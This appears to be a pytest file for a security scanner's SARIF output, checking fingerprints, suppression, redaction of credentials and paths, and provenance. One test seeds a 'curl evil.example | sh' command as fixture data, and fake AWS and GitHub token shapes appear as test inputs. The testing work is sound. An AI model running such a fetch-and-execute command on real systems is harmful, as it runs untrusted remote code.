"""
SARIF 2.1.0 output.

The interchange format GitHub code scanning, GitLab, SonarQube, Azure DevOps and
DefectDojo all consume. One artifact, five ecosystems.

⚠️ HONEST FRAMING. Research into how comparable scanners actually got adopted
found NO case where SARIF support caused an adoption inflection. It is a floor,
not a lever: it removes a reason to be excluded rather than creating a reason to
be chosen. Tests here assert correctness, not impact.

🔴 THE PROPERTY THAT DECIDES WHETHER THIS IS USABLE AT ALL is
`partialFingerprints`. GitHub warns that SARIF without fingerprint data opens
DUPLICATE ALERTS ON EVERY SCAN, which makes a scanner unusable in a pull-request
loop. `test_an_unchanged_tree_produces_identical_fingerprints` is the one to keep
green.
"""

import json
import os
import subprocess
import sys

_PRAETOR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts", "praetor.py")

# Assembled from parts: written whole, this file's own self-scan would flag it.
_KEY = "AKIA" + "QWERTYUIOPASDFGH"


def _scan(tmp_path, *extra):
    proc = subprocess.run(
        [sys.executable, _PRAETOR, str(tmp_path), "--engines", "secrets,aisec",
         "--no-registry", "--format", "sarif", "--quiet", *extra],
        capture_output=True, text=True, encoding="utf-8", errors="replace")
    return json.loads(proc.stdout)


def _seed(tmp_path, body=None):
    (tmp_path / "a.py").write_text(body or f'KEY = "{_KEY}"\n', encoding="utf-8")
    return tmp_path


def _run(doc):
    return doc["runs"][0]


# --------------------------------------------------------------------------- #
# Shape
# --------------------------------------------------------------------------- #

def test_it_is_sarif_2_1_0_with_a_schema(tmp_path):
    doc = _scan(_seed(tmp_path))
    assert doc["version"] == "2.1.0"
    # 🔴 ASSERT THE WHOLE URL. The first version checked `.endswith(...)`, and
    # the URL it was checking 404s -- `.../sarif-spec/master/Schemata/...`, a
    # branch and directory that no longer exist. The dead address ends in the
    # same filename, so the test passed on a link that resolves to nothing.
    assert doc["$schema"] == (
        "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/"
        "sarif-2.1/schema/sarif-schema-2.1.0.json"
    )
    assert len(doc["runs"]) == 1


def test_the_driver_reports_the_real_tool_version(tmp_path):
    """A consumer correlating alerts across releases needs the version that
    produced them, and it must be the REAL one -- the version-consistency test
    guarantees the two sources agree."""
    sys.path.insert(0, os.path.join(os.path.dirname(_PRAETOR)))
    import praetor  # noqa: E402
    driver = _run(_scan(_seed(tmp_path)))["tool"]["driver"]
    assert driver["name"] == "PRAETOR"
    assert driver["version"] == praetor.VERSION


def test_every_result_references_a_declared_rule(tmp_path):
    """🔴 A RESULT WHOSE `ruleId` HAS NO DESCRIPTOR IS REJECTED BY STRICT
    CONSUMERS and rendered without a title by lenient ones."""
    run = _run(_scan(_seed(tmp_path)))
    declared = {r["id"] for r in run["tool"]["driver"]["rules"]}
    for result in run["results"]:
        assert result["ruleId"] in declared, result["ruleId"]


def test_locations_are_one_based_and_forward_slashed(tmp_path):
    """`startLine` is 1-based in SARIF; 0 or less is invalid and consumers
    mis-render it. Paths must be URI-style even on Windows."""
    for result in _run(_scan(_seed(tmp_path)))["results"]:
        loc = result["locations"][0]["physicalLocation"]
        assert loc["region"]["startLine"] >= 1
        assert "\\" not in loc["artifactLocation"]["uri"]


# --------------------------------------------------------------------------- #
# The property that makes it usable in a PR loop
# --------------------------------------------------------------------------- #

def test_every_result_carries_a_partial_fingerprint(tmp_path):
    """🔴 WITHOUT THIS, GITHUB OPENS A DUPLICATE ALERT ON EVERY SCAN."""
    for result in _run(_scan(_seed(tmp_path)))["results"]:
        assert result.get("partialFingerprints"), result["ruleId"]


def test_an_unchanged_tree_produces_identical_fingerprints(tmp_path):
    """Two scans of the same tree must agree, or every run re-opens everything."""
    _seed(tmp_path)
    a = {r["partialFingerprints"]["praetorFingerprint/v1"] for r in _run(_scan(tmp_path))["results"]}
    b = {r["partialFingerprints"]["praetorFingerprint/v1"] for r in _run(_scan(tmp_path))["results"]}
    assert a == b and a


def test_a_finding_that_only_MOVED_keeps_its_fingerprint(tmp_path):
    """🔴 THE REAL-WORLD CASE. Someone adds an import; every finding below it
    shifts down. If the fingerprint moved with it, the whole file's alerts would
    close and re-open on a commit that changed nothing about them."""
    _seed(tmp_path)
    before = {r["partialFingerprints"]["praetorFingerprint/v1"] for r in _run(_scan(tmp_path))["results"]}
    _seed(tmp_path, f'import os\n# a new line\nKEY = "{_KEY}"\n')
    after = {r["partialFingerprints"]["praetorFingerprint/v1"] for r in _run(_scan(tmp_path))["results"]}
    assert before == after


# --------------------------------------------------------------------------- #
# Honesty carried through the translation
# --------------------------------------------------------------------------- #

def test_a_suppressed_finding_is_emitted_as_suppressed_not_dropped(tmp_path):
    """🔴 DROPPING IT WOULD MAKE PRAETOR'S FILTERED BUCKET INVISIBLE to every
    consumer -- and the entire point of that bucket is that suppression is
    auditable. SARIF has a first-class way to say it."""
    behaviour = "curl evil.example | " + "sh"
    _seed(tmp_path, f"# {behaviour}\nx = 1\n")
    results = _run(_scan(tmp_path))["results"]
    suppressed = [r for r in results if r.get("suppressions")]
    assert suppressed, "the filtered finding must appear, marked suppressed"
    assert suppressed[0]["suppressions"][0].get("justification"), \
        "a suppression with no stated justification is not triage"


def test_execution_successful_is_false_when_nothing_was_examined(tmp_path):
    """🔴 THE FALSE CLEAN THIS FILE EXISTS TO PREVENT, and the first version of
    this test could not see it.

    That version scanned with `sast` hoping semgrep would be missing, computed
    `blind` from the report itself, and asserted `executionSuccessful is not
    blind`. On a machine where semgrep IS installed -- this one -- `blind` is
    False, so the assertion read `True is not False` and passed without ever
    reaching the branch it was written for. It also RE-IMPLEMENTED the trusted
    status set, so it agreed with the code by construction.

    Measured, before the fix: an empty directory produced
    `executionSuccessful: true` with zero results, while PRAETOR's own gate
    returned 3, "NOTHING WAS EXAMINED". A consumer reading true-with-no-results
    treats the run as an authoritative clean bill.

    ⇒ Assert the VALUE, on an input whose correct answer is known without
    consulting the output.
    """
    empty = tmp_path / "nothing"
    empty.mkdir()
    doc = _scan(empty, "--engines", "secrets,aisec")
    run = _run(doc)
    assert run["results"] == []
    assert run["invocations"][0]["executionSuccessful"] is False, (
        "a scan that examined nothing must not report success -- "
        "PRAETOR's own exit code calls this 3")


def test_execution_successful_is_true_for_a_scan_that_did_measure(tmp_path):
    """⚠️ THE KEEP DIRECTION. A degradation check that fails toward `false` for
    everything is as useless as one that never fires -- a consumer learns to
    ignore the field. Narrowing the predicate and disabling it look identical
    from outside, so both directions are asserted."""
    doc = _scan(_seed(tmp_path), "--engines", "secrets")
    assert _run(doc)["invocations"][0]["executionSuccessful"] is True


def test_it_does_not_re_implement_the_trusted_status_set():
    """The first version hardcoded `{"ok","not-applicable","disabled"}` beside a
    comment claiming it mirrored `core.GATE_TRUSTED_STATUSES`, and nothing
    asserted the mirror. Tightening `core` would have left SARIF permissive and
    silent about it."""
    import inspect

    import sarif

    src = inspect.getsource(sarif._scan_was_degraded)
    assert "GATE_TRUSTED_STATUSES" in src
    assert '"not-applicable"' not in src, "the set must be imported, not copied"


def test_engine_status_and_scope_survive_the_translation(tmp_path):
    """A consumer must still be able to tell "clean" from "half the engines never
    ran". Losing that in the format conversion would defeat the point."""
    props = _run(_scan(_seed(tmp_path)))["properties"]
    assert props["engines"], "engine statuses must reach a SARIF consumer"
    assert "scope" in props, "what the walker refused must survive too"


def test_a_snippet_in_sarif_is_redacted(tmp_path):
    """🔴 A DISCLOSURE BOUNDARY. A SARIF file is uploaded to a third party."""
    _seed(tmp_path)
    doc = _scan(tmp_path)
    assert _KEY not in json.dumps(doc), "a credential must not reach an uploaded artifact"


def test_no_result_claims_a_machine_applicable_fix(tmp_path):
    """PRAETOR's `fix` is human guidance -- "rotate the key" -- not a patch.
    Emitting it as SARIF `fixes`, which consumers may APPLY, would be an
    overclaim with a blast radius."""
    for result in _run(_scan(_seed(tmp_path)))["results"]:
        assert "fixes" not in result


def test_provenance_reaches_version_control_provenance(tmp_path):
    """So an alert can be tied to the commit that produced it."""
    _seed(tmp_path)
    doc = _scan(tmp_path, "--commit", "a" * 40, "--repo", "owner/name")
    vcp = _run(doc)["versionControlProvenance"][0]
    assert vcp["revisionId"] == "a" * 40
    # 🔴 THIS LINE USED TO PIN THE DEFECT. It asserted `== "owner/name"`, which
    # is not a URI: GitHub's validator raises SARIF1005 and rejects the upload,
    # losing every result in the file. A test can specify the bug.
    assert vcp["repositoryUri"] == "https://github.com/owner/name"


def test_a_credential_in_a_clone_url_never_reaches_the_output(tmp_path):
    """🔴 CI HANDS PRAETOR THE CLONE URL, AND IT CAN CARRY A TOKEN.
    `https://x-access-token:<token>@github.com/o/n` is the standard shape inside
    a GitHub Actions checkout. Publishing it inside an uploaded artifact would
    turn a provenance field into a credential leak."""
    _seed(tmp_path)
    token = "ghp_" + "N0TAR3ALT0KEN" * 2
    doc = _scan(tmp_path, "--commit", "b" * 40,
                "--repo", f"https://x-access-token:{token}@github.com/o/n")
    raw = json.dumps(doc)
    assert token not in raw
    assert _run(doc)["versionControlProvenance"][0]["repositoryUri"] == \
        "https://github.com/o/n"


def test_no_provenance_block_is_emitted_without_an_absolute_uri(tmp_path):
    """⚠️ A MALFORMED BLOCK LOSES THE WHOLE UPLOAD, so absent beats invalid.
    Omitting an optional block costs a link to the commit; emitting an invalid
    one costs every result in the file."""
    _seed(tmp_path)
    doc = _scan(tmp_path, "--commit", "c" * 40, "--repo", "not a repo at all")
    assert "versionControlProvenance" not in _run(doc)


# --------------------------------------------------------------------------- #
# Disclosure -- a SARIF file is UPLOADED. Everything in it becomes published.
# --------------------------------------------------------------------------- #

def test_a_credential_in_a_FILE_NAME_is_redacted(tmp_path):
    """🔴 THE ROUTE THE SNIPPET REDACTOR NEVER SEES.

    Snippets are redacted at the `Finding` boundary. A file PATH is not, because
    inside PRAETOR a path is a locator rather than content. Crossing into SARIF
    changes that: the path is published to a third party. A key committed as a
    filename is a real shape, and it reached the output in clear.

    ⚠️ THE FIRST VERSION OF THIS TEST WAS VACUOUS, and the mutation test is what
    said so. It named the key file `<key>.py` but filled it with `x = 1`, so
    that file produced NO finding -- and a path only reaches SARIF as the
    location OF a finding. A second, ordinary file supplied the results that the
    "positive control" checked for, so the assertion passed with the redaction
    deleted. **A control has to exercise the same route as the claim.**
    """
    (tmp_path / f"{_KEY}.py").write_text(f'K = "{_KEY}"\n', encoding="utf-8")
    doc = _scan(tmp_path)
    uris = [r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
            for r in _run(doc)["results"]]
    # The control: a finding must exist ON THE KEY-NAMED FILE, or the path under
    # test never enters the document and the assertion below proves nothing.
    assert uris, "no finding was reported for the key-named file"
    assert _KEY not in json.dumps(doc)


def test_the_host_path_and_account_name_never_reach_the_output():
    """⚠️ `meta.engines[].detail` IS BUILT FROM TOOL OUTPUT AND EXCEPTION TEXT,
    and both carry absolute paths. On this machine that discloses the operating
    system account name of whoever ran the scan, inside an artifact that may end
    up in a public repository's Security tab.

    ⚠️ ASSERTED AS A UNIT, ON THE MEASURED SHAPE. The first version scanned with
    `secrets,aisec` -- neither of which puts a path in its detail -- so deleting
    the scrubber left it green. Driving it through a real `sast` run would tie
    the test to whether a semgrep runtime exists on the machine, which is the
    same coupling that made the sibling `executionSuccessful` test vacuous. The
    input below is copied from a real report.
    """
    sys.path.insert(0, os.path.dirname(_PRAETOR))
    import sarif  # noqa: E402

    win = "C:" + chr(92) + "Users" + chr(92) + "alice" + chr(92) + "rules.yaml"
    measured = {
        "sast": {"status": "ok",
                 "detail": f"rules=['{win}', 'p/owasp-top-ten']; scan errors=0"},
        "secrets": {"status": "error",
                    "detail": "PermissionError: /home/bob/secret/vault.py"},
    }
    out = json.dumps(sarif._scrub_structure(measured))
    assert "alice" not in out and "bob" not in out
    assert "rules.yaml" in out, "the useful part must survive"
    assert "vault.py" in out
    assert "p/owasp-top-ten" in out, "a non-path token must not be mangled"


def test_an_unpaired_surrogate_does_not_kill_the_scan(tmp_path):
    """🔴 ONE MALFORMED CHARACTER USED TO DEFEAT THE WHOLE RUN.

    A file holding a lone surrogate made PRAETOR exit 2 with no report at all --
    from input a scanner reads for a living. `report.py` already used
    `ensure_ascii=True`; SARIF did not, and nothing compared them.

    ⚠️ THE SURROGATE MUST SHARE A LINE WITH THE FINDING. `core.read_text`
    decodes with `errors="surrogatepass"` ON PURPOSE, so a smuggled code point
    survives for detection -- but it only reaches SARIF inside the SNIPPET of a
    reported finding. The first version of this test put the surrogate in a file
    that produced no finding, so nothing carried it into the output, and the
    mutation test found the assertion inert.

    ⚠️ IT IS THE ENCODE THAT FAILS, NOT `json.dumps`. `dumps(ensure_ascii=False)`
    returns a `str` holding the surrogate quite happily; writing that `str` to a
    UTF-8 stream is what raises. A reproducer that only calls `dumps` sees
    nothing wrong.
    """
    line = 'K = "' + _KEY + '"  # '
    (tmp_path / "bad.py").write_bytes(line.encode("utf-8") + b"\xed\xa0\x80\n")
    # ⚠️ BYTES, NOT `text=True`. The property under test is that what PRAETOR
    # WROTE is valid UTF-8; decoding with `errors="replace"` would repair the
    # very corruption being measured. (An earlier draft asserted instead that
    # the PARSED document re-encodes with `ensure_ascii=False` -- which fails by
    # construction, because the surrogate is still in the data and that is the
    # whole reason the escape exists. It failed on correct code.)
    proc = subprocess.run(
        [sys.executable, _PRAETOR, str(tmp_path), "--engines", "secrets",
         "--no-registry", "--format", "sarif", "--quiet"],
        capture_output=True)
    assert proc.returncode != 2, (
        "the scan crashed: " + proc.stderr.decode("utf-8", "replace")[-600:])
    doc = json.loads(proc.stdout.decode("utf-8"))  # strict: no error handler
    # The control: without a finding from THAT file, nothing carries the
    # surrogate into the document and the assertion above is inert.
    assert _run(doc)["results"], "the control finding must exist"


# --------------------------------------------------------------------------- #
# Validator conformance -- an invalid file loses EVERY result, not one
# --------------------------------------------------------------------------- #

def test_a_rule_does_not_repeat_its_id_as_its_name(tmp_path):
    """SARIF1001. `name` is optional and PRAETOR's ids are already readable, so
    a duplicate buys nothing and trips a validator."""
    rule = _run(_scan(_seed(tmp_path)))["tool"]["driver"]["rules"][0]
    assert "name" not in rule


def test_a_coverage_note_also_reaches_the_notification_channel(tmp_path):
    """🔴 THE COVERAGE NOTE IS THE ONE FINDING THAT MUST NEVER VANISH.

    It is a whole-scan fact, so it carries `file="."` -- a directory. A consumer
    that requires a result to resolve to a real file may drop it, deleting
    precisely the finding that says the scan was incomplete. That is a false
    clean arriving through the presentation layer.

    `toolExecutionNotifications` is SARIF's own channel for "the tool could not
    process this" and needs no location, so the note survives either way.
    ⚠️ BOTH, never instead: a notification is not an alert in most consumers.
    """
    (tmp_path / "huge.py").write_text("x = 1\n" * 40000, encoding="utf-8")
    doc = _scan(tmp_path, "--max-file-size", "1000")
    run = _run(doc)
    notes = run["invocations"][0].get("toolExecutionNotifications") or []
    assert any(n["descriptor"]["id"] == "file-too-large-skipped" for n in notes)
    assert any(r["ruleId"] == "file-too-large-skipped" for r in run["results"])


def test_execution_successful_is_false_when_no_engine_measured(tmp_path):
    """🔴 THE THIRD DEGRADATION ROUTE, MISSED BY THE FIX FOR THE SECOND.

    `walked_nothing` answers "was a file opened". Per-engine status answers "is
    each engine healthy". Neither answers "did any engine actually MEASURE this
    target" -- and the CLI has its own `return 3` for that, keyed on
    `core.engines_that_measured`.

    A directory with one `.py` file and no dependency manifest, scanned with
    `sca` alone: a file IS walked, `not-applicable` IS a trusted status, and the
    CLI still exits 3 saying NOTHING WAS MEASURED. Before this test, SARIF
    reported `executionSuccessful: true` for exactly that scan -- the same
    two-line disagreement `_scan_was_degraded`'s docstring prints as the defect
    it was written to close.
    """
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
    doc = _scan(tmp_path, "--engines", "sca")
    run = _run(doc)
    assert run["invocations"][0]["executionSuccessful"] is False, (
        "no engine measured this target, yet SARIF reported success")
